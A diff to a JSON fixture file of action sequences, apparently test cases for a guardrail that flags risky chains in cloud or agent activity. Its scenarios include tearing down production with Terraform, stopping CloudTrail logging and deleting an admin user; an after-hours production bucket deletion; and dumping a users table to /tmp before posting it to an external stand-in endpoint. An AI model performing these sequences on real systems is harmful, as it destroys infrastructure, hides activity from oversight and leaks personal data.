@@ -2,32 +2,53 @@
   "version": "0.1",
   "sequences": [
     {
-      "name": "cleanup_chain",
-      "description": "Destroy infra then remove audit trail then delete principal",
-      "steps": [
-        { "action": "aws:terraform:Destroy", "parameters": { "workspace": "prod" } },
-        { "action": "aws:cloudtrail:StopLogging", "parameters": { "trail_name": "org-trail" } },
-        { "action": "aws:iam:DeleteUser", "parameters": { "user_name": "breakglass-user" } }
-      ]
-    },
-    {
-      "name": "s3_after_hours_delete",
-      "description": "Delete bucket after hours should be blocked",
+      "name": "destructive_cleanup_chain",
+      "description": "Infrastructure teardown followed by audit suppression and principal deletion",
       "steps": [
         {
-          "action": "aws:s3:DeleteBucket",
-          "parameters": { "bucket_name": "prod-data-archive" },
-          "context": { "timestamp": "2026-03-01T22:10:00Z", "environment": "production" }
+          "action": "aws:terraform:Destroy",
+          "parameters": { "workspace": "production" }
+        },
+        {
+          "action": "aws:cloudtrail:StopLogging",
+          "parameters": { "trail_name": "organization-trail" }
+        },
+        {
+          "action": "aws:iam:DeleteUser",
+          "parameters": { "user_name": "automation-admin" }
         }
       ]
     },
     {
-      "name": "exfiltration_chain",
-      "description": "Extract data, stage locally, attempt outbound post",
+      "name": "after_hours_bucket_delete",
+      "description": "Bucket deletion attempt in production outside business hours",
       "steps": [
-        { "action": "aws:rds:ExecuteStatement", "parameters": { "sql": "SELECT * FROM users" } },
-        { "action": "os:filesystem:WriteFile", "parameters": { "path": "/tmp/exfil.csv" } },
-        { "action": "net:http:Post", "parameters": { "url": "https://example-external.com/upload" } }
+        {
+          "action": "aws:s3:DeleteBucket",
+          "parameters": { "bucket_name": "prod-data-archive" },
+          "context": {
+            "timestamp": "2026-03-01T22:10:00Z",
+            "environment": "production"
+          }
+        }
+      ]
+    },
+    {
+      "name": "data_exfiltration_chain",
+      "description": "Database read followed by local staging and outbound transfer",
+      "steps": [
+        {
+          "action": "aws:rds:ExecuteStatement",
+          "parameters": { "sql": "SELECT * FROM users" }
+        },
+        {
+          "action": "os:filesystem:WriteFile",
+          "parameters": { "path": "/tmp/users_export.csv" }
+        },
+        {
+          "action": "net:http:Post",
+          "parameters": { "url": "https://external-endpoint.example/upload" }
+        }
       ]
     }
   ]
